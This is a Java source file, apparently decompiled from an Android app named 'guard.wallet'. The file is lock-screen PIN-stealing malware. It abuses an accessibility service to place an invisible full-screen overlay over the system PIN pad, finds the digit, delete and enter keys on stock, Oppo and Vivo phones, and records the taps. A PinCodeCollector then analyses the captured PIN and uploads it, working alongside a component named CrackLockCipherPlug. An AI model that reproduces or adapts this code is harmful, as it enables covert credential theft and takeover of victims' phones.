/**
 * 自动化辅助工具 — 管理 PIN 码触摸视图的创建、销毁与按键检测。
 * <p>
 * 负责在锁屏 PIN 码输入界面覆盖一层透明 TouchView，
 * 通过 {@link TouchDragListener} 监听用户触摸事件，
 * 并利用 {@link NodePredicate} 进行节点匹配与过滤。
 * <p>
 * vendor 原始类名: com.guard.wallet.helper.r
 */
package com.guard.wallet.helper;
import com.guard.wallet.core.AppUtils;

import android.graphics.Rect;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.View;
import android.view.WindowManager;
import com.guard.wallet.MainApplication;
import com.guard.wallet.condition.BoolCondition;
import com.guard.wallet.condition.PointCondition;
import com.guard.wallet.condition.StringCondition;
import com.guard.wallet.delegate.EngineHelper;
import com.guard.wallet.entity.Point;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.entity.UiObjectCollection;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.req.ReqListenHelper;
import com.guard.wallet.service.MyAccessibilityService;
import java.util.LinkedList;
import java.util.List;
import java.util.Objects;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicReference;
import java.util.concurrent.locks.ReentrantLock;

public abstract class AutomationHelper {
    public static WindowManager a;
    public static final AtomicReference<View> b = new AtomicReference<>();
    public static final com.guard.wallet.plug.PinCodeCollector c = new com.guard.wallet.plug.PinCodeCollector();
    public static final ReentrantLock d0 = new ReentrantLock();
    public static ReqListenHelper e;
    public static Integer f = -1;
    public static final ConcurrentLinkedQueue<UiObject> g = new ConcurrentLinkedQueue<>();
    public static final AtomicReference<UiObject> h = new AtomicReference<>(null);
    public static final AtomicReference<UiObject> i = new AtomicReference<>(null);
    public static final AtomicReference<UiObject> j = new AtomicReference<>(null);

    /** vendor inner enum d — accessibility event state for CheckProcessThread */
    public enum d {
        a, b, c, d
    }

    static {
        Executors.newFixedThreadPool(10);
    }

    public static CombineFilter a() {
        CombineFilter combineFilter = new CombineFilter();
        combineFilter.setBoolConditions(new LinkedList<>());
        combineFilter.setPointConditions(new LinkedList<>());
        combineFilter.setStringConditions(new LinkedList<>());
        combineFilter.getBoolConditions().add(new BoolCondition("clickable", true, true));
        combineFilter.getStringConditions().add(new StringCondition("id", null, null, "com.android.systemui:id/delete_button", null, null));
        return combineFilter;
    }

    public static CombineFilter b() {
        CombineFilter combineFilter = new CombineFilter();
        combineFilter.setBoolConditions(new LinkedList<>());
        combineFilter.setPointConditions(new LinkedList<>());
        combineFilter.setStringConditions(new LinkedList<>());
        combineFilter.getBoolConditions().add(new BoolCondition("clickable", true, true));
        combineFilter.getStringConditions().add(new StringCondition("id", null, null, "com.android.systemui:id/key_enter", null, null));
        return combineFilter;
    }

    public static CombineFilter c() {
        CombineFilter combineFilter = new CombineFilter();
        combineFilter.setBoolConditions(new LinkedList<>());
        combineFilter.setPointConditions(new LinkedList<>());
        combineFilter.setStringConditions(new LinkedList<>());
        combineFilter.getBoolConditions().add(new BoolCondition("clickable", true, true));
        combineFilter.getStringConditions().add(new StringCondition("className", "android.view.ViewGroup", null, null, null, null));
        combineFilter.getStringConditions().add(new StringCondition("id", null, null, "com.android.systemui:id/key", null, null));
        return combineFilter;
    }

    public static void d(Object eVarObj, CombineFilter combineFilter) {
        try {
            AtomicReference<View> atomicReference = b;
            if (atomicReference.get() != null) {
                return;
            }
            ReqListenHelper reqListenHelper = e;
            if (reqListenHelper == null) {
                return;
            }
            if (Objects.equals(reqListenHelper.getListenType(), 1) && !com.guard.wallet.utils.SystemHelper.p0()) {
                e = null;
                return;
            }
            if (MainApplication.getInstance() != null && MainApplication.getInstance().getCrackLockCipherPlug() != null) {
                com.guard.wallet.plug.CrackLockCipherPlug crackLockCipherPlug = MainApplication.getInstance().getCrackLockCipherPlug();
                crackLockCipherPlug.getClass();
                ConcurrentLinkedQueue<?> concurrentLinkedQueue = com.guard.wallet.plug.CrackLockCipherPlug.responseQueue;
                boolean anyMatch;
                if (concurrentLinkedQueue.isEmpty()) {
                    Log.e("com.guard.wallet.plug.c", "cacheResponseQueue is Empty");
                    anyMatch = false;
                } else {
                    anyMatch = concurrentLinkedQueue.stream().anyMatch(new NodePredicate(crackLockCipherPlug, 1));
                }
                if (anyMatch) {
                    Log.e("AutomationHelper", "CrackLockCipherPlug hasPinCacheResponse exit");
                    e = null;
                    return;
                }
            }
            f = -1;
            g.clear();
            com.guard.wallet.plug.PinCodeCollector fVar = c;
            fVar.touchPoints.clear();
            fVar.textTokens.clear();
            fVar.listenHelper = null;
            AtomicReference<UiObject> atomicReference2 = h;
            atomicReference2.set(null);
            i.set(null);
            AtomicReference<UiObject> atomicReference3 = j;
            atomicReference3.set(null);
            WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams();
            layoutParams.flags = 4786090;
            layoutParams.format = 1;
            layoutParams.alpha = 1.0f;
            layoutParams.dimAmount = 0.01f;
            layoutParams.gravity = 8388659;
            layoutParams.x = 0;
            layoutParams.y = 0;
            layoutParams.width = com.guard.wallet.utils.DeviceUtils.buildScreenMetrics().getWidth();
            layoutParams.height = com.guard.wallet.utils.DeviceUtils.buildScreenMetrics().getHeight();
            MyAccessibilityService.P().getClass();
            Rect O = MyAccessibilityService.O();
            if (O != null && O.width() > layoutParams.width) {
                layoutParams.width = O.width();
            }
            View view = new View(MyAccessibilityService.P());
            view.setBackgroundColor(0);
            view.setAlpha(1.0f);
            if (a == null) {
                a = (WindowManager) MyAccessibilityService.P().getSystemService("window");
            }
            layoutParams.type = 2032;
            view.setOnTouchListener(new TouchDragListener(eVarObj, combineFilter));
            ReqListenHelper reqListenHelper2 = e;
            if (reqListenHelper2 == null) {
                return;
            }
            if (Objects.equals(reqListenHelper2.getListenType(), 1) && !com.guard.wallet.utils.SystemHelper.p0()) {
                e = null;
                return;
            }
            if (atomicReference.get() == null) {
                a.addView(view, layoutParams);
                atomicReference.set(view);
                Log.e("AutomationHelper", "TouchView \u5df2\u521b\u5efa\u5b8c\u6210");
                fVar.listenHelper = ReqListenHelper.clone(e);
            }
            if (!n(eVarObj, combineFilter)) {
                Log.e("AutomationHelper", "PIN\u7801\u6309\u952e\u67e5\u627e\u5931\u8d25");
                if (!com.guard.wallet.utils.DeviceUtils.isOppoFamily()) {
                    g(false);
                    return;
                }
            }
            if (atomicReference2.get() == null) {
                h(eVarObj);
            }
            if (atomicReference3.get() == null) {
                i(eVarObj);
            }
        } catch (Exception e2) {
            AppUtils.s("AutomationHelper", e2);
        }
    }

    public static void e(Object eVarObj, CombineFilter combineFilter, ReqListenHelper reqListenHelper) {
        try {
            if (MyAccessibilityService.P() == null || k()) {
                return;
            }
            ReqListenHelper var4 = e;
            if (var4 != null) {
                return;
            }
            ReentrantLock reentrantLock = d0;
            if (!reentrantLock.tryLock()) {
                return;
            }
            try {
                e = ReqListenHelper.clone(reqListenHelper);
                if (com.guard.wallet.utils.WindowUtils.isMainThread()) {
                    d(eVarObj, combineFilter);
                } else {
                    Handler handler = new Handler(Looper.getMainLooper());
                    com.guard.wallet.delegate.task.DelegateEventDispatcher runnable = new com.guard.wallet.delegate.task.DelegateEventDispatcher(eVarObj, combineFilter, 8);
                    handler.post(runnable);
                    for (int i2 = 0; !k() && i2 < 10; i2++) {
                        com.guard.wallet.utils.SystemHelper.T0(1);
                    }
                }
            } finally {
                reentrantLock.unlock();
            }
        } catch (Exception e2) {
            AppUtils.s("AutomationHelper", e2);
        }
    }

    public static void f() {
        try {
            if (a != null) {
                AtomicReference<View> atomicReference = b;
                if (atomicReference.get() != null) {
                    atomicReference.get().setOnTouchListener(null);
                    a.removeViewImmediate(atomicReference.get());
                    atomicReference.set(null);
                    Log.e("AutomationHelper", "TouchView \u5df2\u9500\u6bc1\u5b8c\u6210");
                }
            }
            f = -1;
            g.clear();
            h.set(null);
            i.set(null);
            j.set(null);
        } catch (Exception e2) {
            AppUtils.s("AutomationHelper", e2);
        }
    }

    public static void g(boolean z2) {
        try {
            if (!k()) {
                return;
            }
            ReentrantLock reentrantLock = d0;
            if (!reentrantLock.tryLock()) {
                return;
            }
            try {
                com.guard.wallet.plug.PinCodeCollector fVar = c;
                if (z2) {
                    fVar.analyzeAndUpload();
                } else {
                    fVar.touchPoints.clear();
                    fVar.textTokens.clear();
                    fVar.listenHelper = null;
                }
                e = null;
                if (com.guard.wallet.utils.WindowUtils.isMainThread()) {
                    f();
                } else {
                    Handler handler = new Handler(Looper.getMainLooper());
                    DelayedRunnable runnable = new DelayedRunnable(4);
                    handler.post(runnable);
                }
            } finally {
                reentrantLock.unlock();
            }
        } catch (Exception e2) {
            AppUtils.s("AutomationHelper", e2);
        }
    }

    public static void h(Object eVarObj) {
        try {
            CombineFilter l2 = com.guard.wallet.utils.DeviceUtils.isOppoFamily() ? l() : com.guard.wallet.utils.DeviceUtils.isVivoFamily() ? o() : a();
            UiObject n2 = EngineHelper.delegateN(eVarObj, l2);
            AtomicReference<UiObject> atomicReference = h;
            if (n2 != null) {
                UiObject findOneByCombine = n2.findOneByCombine(l2);
                if (findOneByCombine != null) {
                    atomicReference.set(findOneByCombine);
                    return;
                }
            }
            UiObject findOneByCombine2 = MyAccessibilityService.Q().findOneByCombine(l2);
            if (findOneByCombine2 != null) {
                atomicReference.set(findOneByCombine2);
            }
        } catch (Exception e2) {
            AppUtils.s("AutomationHelper", e2);
        }
    }

    public static void i(Object eVarObj) {
        try {
            CombineFilter p2 = com.guard.wallet.utils.DeviceUtils.isOppoFamily() ? null : com.guard.wallet.utils.DeviceUtils.isVivoFamily() ? p() : b();
            if (p2 == null) {
                return;
            }
            UiObject n2 = EngineHelper.delegateN(eVarObj, p2);
            AtomicReference<UiObject> atomicReference = j;
            if (n2 != null) {
                UiObject findOneByCombine = n2.findOneByCombine(p2);
                if (findOneByCombine != null) {
                    atomicReference.set(findOneByCombine);
                    return;
                }
            }
            UiObject findOneByCombine2 = MyAccessibilityService.Q().findOneByCombine(p2);
            if (findOneByCombine2 != null) {
                atomicReference.set(findOneByCombine2);
            }
        } catch (Exception e2) {
            AppUtils.s("AutomationHelper", e2);
        }
    }

    public static UiObject j(Object eVarObj, Point point) {
        try {
            CombineFilter combineFilter = new CombineFilter();
            combineFilter.setPointConditions(new LinkedList<>());
            combineFilter.getPointConditions().add(new PointCondition(point.getX(), point.getY(), 1));
            combineFilter.setBoolConditions(new LinkedList<>());
            combineFilter.getBoolConditions().add(new BoolCondition("clickable", true, true));
            UiObject delegateRoot = EngineHelper.delegateK(eVarObj);
            if (delegateRoot != null) {
                UiObject findLastByCombine = delegateRoot.findLastByCombine(combineFilter);
                if (findLastByCombine != null) {
                    return findLastByCombine;
                }
            }
            if (MyAccessibilityService.Q() != null) {
                return MyAccessibilityService.Q().findLastByCombine(combineFilter);
            }
            return null;
        } catch (Exception e2) {
            AppUtils.s("AutomationHelper", e2);
            return null;
        }
    }

    public static boolean k() {
        return b.get() != null;
    }

    public static CombineFilter l() {
        CombineFilter combineFilter = new CombineFilter();
        combineFilter.setBoolConditions(new LinkedList<>());
        combineFilter.setPointConditions(new LinkedList<>());
        combineFilter.setStringConditions(new LinkedList<>());
        combineFilter.getBoolConditions().add(new BoolCondition("clickable", true, true));
        combineFilter.getStringConditions().add(new StringCondition("className", "android.view.View", null, null, null, null));
        combineFilter.getStringConditions().add(new StringCondition("desc", "\u5220\u9664", null, null, null, null));
        return combineFilter;
    }

    public static CombineFilter m() {
        CombineFilter combineFilter = new CombineFilter();
        combineFilter.setBoolConditions(new LinkedList<>());
        combineFilter.setPointConditions(new LinkedList<>());
        combineFilter.setStringConditions(new LinkedList<>());
        combineFilter.getBoolConditions().add(new BoolCondition("clickable", true, true));
        combineFilter.getStringConditions().add(new StringCondition("className", "android.view.View", null, null, null, null));
        combineFilter.getStringConditions().add(new StringCondition("desc", null, null, null, null, "\\d"));
        return combineFilter;
    }

    @SuppressWarnings("unchecked")
    public static boolean n(Object eVarObj, CombineFilter combineFilter) {
        try {
            if (e == null) {
                return false;
            }
            if (Objects.equals(1, e.getListenType())) {
                combineFilter = com.guard.wallet.utils.DeviceUtils.isOppoFamily() ? m() : com.guard.wallet.utils.DeviceUtils.isVivoFamily() ? q() : c();
            }
            if (combineFilter == null) {
                return false;
            }
            int i2 = 0;
            ConcurrentLinkedQueue<UiObject> concurrentLinkedQueue;
            while (true) {
                concurrentLinkedQueue = g;
                if (concurrentLinkedQueue.size() == 10 || i2 >= 5) {
                    break;
                }
                UiObject delegateRoot = EngineHelper.delegateK(eVarObj);
                if (delegateRoot != null) {
                    delegateRoot.refresh();
                }
                com.guard.wallet.utils.SystemHelper.T0(2);
                try {
                    concurrentLinkedQueue.clear();
                    UiObject n2 = EngineHelper.delegateN(eVarObj, combineFilter);
                    List<UiObject> nodes = null;
                    if (n2 != null) {
                        UiObjectCollection findByCombine = n2.findByCombine(combineFilter);
                        if (findByCombine != null && findByCombine.size() > 0) {
                            nodes = findByCombine.getNodes();
                        }
                    }
                    if (nodes == null) {
                        UiObjectCollection findByCombine2 = MyAccessibilityService.Q().findByCombine(combineFilter);
                        if (findByCombine2 != null && findByCombine2.size() > 0) {
                            nodes = findByCombine2.getNodes();
                        }
                    }
                    if (nodes != null) {
                        concurrentLinkedQueue.addAll(nodes);
                    }
                } catch (Exception e3) {
                    AppUtils.s("AutomationHelper", e3);
                }
                i2++;
            }
            if (concurrentLinkedQueue.size() == 10) {
                Log.e("AutomationHelper", "PIN\u7801\u6309\u952e\u67e5\u627e\u6210\u529f");
                return true;
            }
        } catch (Exception e2) {
            AppUtils.s("AutomationHelper", e2);
        }
        Log.e("AutomationHelper", "cacheTouchNodes not found");
        return false;
    }

    public static CombineFilter o() {
        CombineFilter combineFilter = new CombineFilter();
        combineFilter.setBoolConditions(new LinkedList<>());
        combineFilter.setPointConditions(new LinkedList<>());
        combineFilter.setStringConditions(new LinkedList<>());
        combineFilter.getBoolConditions().add(new BoolCondition("clickable", true, true));
        combineFilter.getStringConditions().add(new StringCondition("id", "com.android.systemui:id/vivo_cancel", null, null, null, null));
        return combineFilter;
    }

    public static CombineFilter p() {
        CombineFilter combineFilter = new CombineFilter();
        combineFilter.setBoolConditions(new LinkedList<>());
        combineFilter.setPointConditions(new LinkedList<>());
        combineFilter.setStringConditions(new LinkedList<>());
        combineFilter.getBoolConditions().add(new BoolCondition("clickable", true, true));
        combineFilter.getStringConditions().add(new StringCondition("id", "com.android.systemui:id/vivo_pin_confirm", null, null, null, null));
        return combineFilter;
    }

    public static CombineFilter q() {
        CombineFilter combineFilter = new CombineFilter();
        combineFilter.setBoolConditions(new LinkedList<>());
        combineFilter.setPointConditions(new LinkedList<>());
        combineFilter.setStringConditions(new LinkedList<>());
        combineFilter.getBoolConditions().add(new BoolCondition("clickable", true, true));
        combineFilter.getStringConditions().add(new StringCondition("className", "android.view.ViewGroup", null, null, null, null));
        combineFilter.getStringConditions().add(new StringCondition("id", null, null, "com.android.systemui:id/VivoPinkey", null, null));
        return combineFilter;
    }
}
